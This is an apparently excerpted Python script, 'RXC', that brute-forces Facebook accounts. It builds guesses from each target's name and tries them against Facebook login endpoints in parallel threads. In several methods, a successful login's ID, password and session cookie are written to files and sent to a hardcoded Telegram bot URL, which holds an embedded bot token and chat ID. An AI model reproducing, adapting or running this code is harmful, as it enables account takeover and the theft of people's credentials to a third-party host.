...
sys.stdout.write('\x1b]2; RXC\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
logo =                                          """            
\t\033[1;31m 888888ba  dP     dP .d88888b  d888888P  .d888888   888888ba  
\t\033[1;31m 88    `8b 88     88 88.    "'    88    d8'    88   88    `8b
\t\033[1;37m 88aaaa8P' 88     88 `Y88888b.    88    88aaaaa88   88aaaa8P' 
\t\033[1;37m 88   `8b. 88     88       `8b    88    88     88   88        
\t\033[1;36m 88     88 Y8.   .8P d8'   .8P    88    88     88   88        
\t\033[1;36m dP     dP `Y88888P'  Y88888P     dP    88     88   dP        
\033[1;37m--------------------------------------------------
\033[1;37m[\033[1;32m✓\033[1;37m] DEV BY    : \033[1;36mRUSTAP CHAUDHARY
\033[1;37m[\033[1;32m✓\033[1;37m] GITHUB    : KIU DU?
\033[1;37m[\033[1;32m✓\033[1;37m] REGIONAL  : NEPAL
\033[1;37m[\033[1;32m✓\033[1;37m] STATUS    : \033[1;32mACTIVE
\033[1;37m[\033[1;32m✓\033[1;37m] TOOL TYPE : \033[1;31mTRIAL
\033[1;37m[\033[1;32m✓\033[1;37m] VERSION   : \033[1;35m3
\033[1;37m-------------------------------------------------- """
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("PRESS ENTER TO BACK RXC GOD MENU ")
        exit()
...
def RXC():   
    ...
    if select =='1':
        ...
        os.system('xdg-open https://facebook.com/groups/3448200698825427/')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        RXC(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RXC] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [RXC-OK] {sid} | {ps} {S}")
                    requests.get("https://api.telegram.org/bot6916527671:AAEy4tujVEb0K9ujrgBkCKBkE9sxLFPZS-I/sendMessage?chat_id=6270301532&text=""[ "+sid+' | '+ps+' | '+cookie+ " ]")
                    oks.append(sid)
                    open('/sdcard/RXC_OK_IDs_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RXC_IDs_COOKIES_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [RXC-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/RXC_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RXC] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    requests.get("https://api.telegram.org/bot6916527671:AAEy4tujVEb0K9ujrgBkCKBkE9sxLFPZS-I/sendMessage?chat_id=6270301532&text=""[ "+sid+' | '+ps+' | '+cookie+ " ]")
                    oks.append(sid)
                    open('/sdcard/RXC_OK_IDs_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RXC_IDs_COOKIES_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [RXC-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RXC] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[RXC] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    requests.get("https://api.telegram.org/bot6916527671:AAEy4tujVEb0K9ujrgBkCKBkE9sxLFPZS-I/sendMessage?chat_id=6270301532&text=""[ "+sid+' | '+ps+' | '+cookie+ " ]")
                    oks.append(sid)
                    open('/sdcard/RXC_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with ThreadPoolExecutor(max_workers=30) as RXCworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                RXCworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                RXCworld.submit(self.methodB, uid, name, pwx)
                   except:pass
            result(oks,cps)      
